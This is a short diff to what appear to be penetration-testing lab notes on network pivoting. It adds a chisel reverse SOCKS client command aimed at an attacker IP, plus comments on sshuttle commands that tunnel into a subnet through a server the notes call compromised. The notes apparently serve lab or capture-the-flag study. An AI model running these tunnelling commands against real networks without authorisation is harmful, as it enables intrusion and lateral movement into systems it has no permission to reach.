@@ -160,6 +160,8 @@ On the target machine start the listening client
 .\chisel.exe client 10.10.14.97:8081 R:8888:127.0.0.1:8888
 
 ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+
+./chisel client 172.16.0.200:4242 R:socks &
 ```
 
 #### Forward SOCKS Proxy
@@ -185,11 +187,11 @@ On our own attacking box we would then use:
 ### sshuttle
 
 ```bash
-
+# 
 sshuttle -r user@172.16.0.5 172.16.0.0/24
-
+# using key-based authentication to the server (172.16.0.5)
 sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
-
+# Exclude compromised server from the subnet range using the -x switch
 sshuttle -r root@10.200.198.200 --ssh-cmd "ssh -i id_rsa" 10.200.198.0/24 -x 10.200.198.200
 ```
 
